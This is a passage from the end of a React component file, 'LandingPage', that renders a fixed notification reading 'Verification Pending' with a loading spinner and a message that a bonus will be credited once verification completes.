            <div className="fixed bottom-6 left-1/2 -translate-x-1/2 w-[90%] max-w-md bg-slate-900/90 backdrop-blur-xl border border-vault-purple/20 p-4 rounded-xl shadow-[0_0_30px_rgba(0,0,0,0.6)] flex items-start gap-4 z-50 animate-in slide-in-from-bottom-10 fade-in duration-500">
                <div className="bg-vault-purple/10 p-2 rounded-full shrink-0">
                    <Info className="w-5 h-5 text-vault-purple" />
                </div>
                <div className="flex-1">
                    <h4 className="text-vault-purple font-bold text-xs uppercase mb-1 tracking-wider">Verification Pending</h4>
                    <p className="text-gray-300 text-xs leading-relaxed font-medium">
                        Once verification is complete, the window will close automatically and your bonus will be credited.
                    </p>
                </div>
                {/* Loading Indicator */}
                <div className="shrink-0">
                    <Loader2 className="w-4 h-4 text-gray-500 animate-spin" />
                </div>
            </div>
        )}
    </div>
  );
};

export default LandingPage;